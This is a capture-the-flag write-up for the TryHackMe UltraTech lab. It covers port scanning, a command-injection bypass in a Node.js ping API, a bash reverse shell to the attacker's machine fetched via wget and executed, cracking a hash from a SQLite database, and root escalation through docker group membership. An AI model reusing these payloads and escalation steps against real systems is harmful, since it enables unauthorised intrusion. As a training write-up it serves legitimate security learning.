# Info

## IP = 10.10.186.2

# Ports

## PortScanning
```bash
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/UltraTech]
└─$ nmap 10.10.186.2       
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-10 21:05 EDT
Nmap scan report for 10.10.186.2
Host is up (0.33s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
8081/tcp open  blackice-icecap
```
```bash
sudo nmap -p- -sS 10.10.186.2 
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
```

## Software Versions
```bash
Aggressive OS guesses: Linux 5.4 (96%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.18 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- _ubuntu_ is the distribution used

## 21
```bash
21/tcp   open  ftp     vsftpd 3.0.3
```
- without `anonymous` user ;-;

## 22
```bash
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc668985e705c2a5da7f01203a13fc27 (RSA)
|   256 c367dd26fa0c5692f35ba0b38d6d20ab (ECDSA)
|_  256 119b5ad6ff2fe449d2b517360e2f1d2f (ED25519)
```

## 8081
```bash
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```
- _node.js_ is the software

### Web Searching
- UltraTech API v0.1.3

### `gobuster`
```bash
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
```

### _/auth_
- get params are: **login** and **password**

### _/ping_
- get params are: **ip**
- RCE?
    - remove ';', '|', '&', '$'
    - error in ``8.8.8.8$(ls)``: `/bin/sh: 1: Syntax error: word unexpected (expecting ")")`
    - works with "\`\`" symbols
    - create _rev shell_ with:

```bash
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/UltraTech]
└─$ echo "bash -i >& /dev/tcp/10.2.54.222/1234 0>&1" > shell.sh
                                                                             
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/UltraTech]
└─$ python -m http.server 80          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:8000/) ...
```
```
# Request with following param:
ip = `wget http://10.2.52.222:80/shell.sh -o shell.sh`

# Doesn't work, so I tried this:
ip = `wget 10.2.54.222/shell.sh -o shell.sh`

# It worked! So I tried this (with open port in attack machine):
ip = `bash shell.sh`

# I got a shell!
```


## 31331
### `gobuster` directory-list-2.3-medium.txt
```bash
/images               (Status: 301) [Size: 320] [--> http://10.10.186.2:31331/images/]                                                                    
/css                  (Status: 301) [Size: 317] [--> http://10.10.186.2:31331/css/]                                                                       
/js                   (Status: 301) [Size: 316] [--> http://10.10.186.2:31331/js/]                                                                        
/javascript           (Status: 301) [Size: 324] [--> http://10.10.186.2:31331/javascript/]
```
### `gobuster` common.txt
```bash
/css                  (Status: 301) [Size: 317] [--> http://10.10.186.2:31331/css/]                                                                       
/favicon.ico          (Status: 200) [Size: 15086]
/images               (Status: 301) [Size: 320] [--> http://10.10.186.2:31331/images/]                                                                    
/index.html           (Status: 200) [Size: 6092]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.186.2:31331/javascript/]                                                                
/js                   (Status: 301) [Size: 316] [--> http://10.10.186.2:31331/js/]                                                                        
/robots.txt           (Status: 200) [Size: 53]
```

### _/js_
- _api.js_
```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

### _/robots.txt_
- /utech_sitemap.txt

### _/utech_sitemap.txt_
- /index.html
- /what.html
- /partners.html

# PrivEsc

## Searching
- in _/home/www/api_, I found a _utech.db.sqlite_

```bash
www@ultratech-prod:~/api$ cat utech.db.sqlite
cat utech.db.sqlite
zz��etableusersusersCREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84
```

- in "https://crackstation.net/", I throw the hash `https://crackstation.net/` and I got `n100906` as password

## ssh with `r00t:n100906`
- got `r00t` shell (isn't root ;-;)

## _linpeas.sh_
- uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
- https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker
```bash
r00t@ultratech-prod:/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        4 years ago         15.8MB
r00t@ultratech-prod:/tmp$ docker run -it -v /:/host/ 495d6437fc1e chroot /host/ bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@ae4466070836:/# whoami
root
```

## In Docker, I found a private ssh key
- check the first 9 chars and GG =D
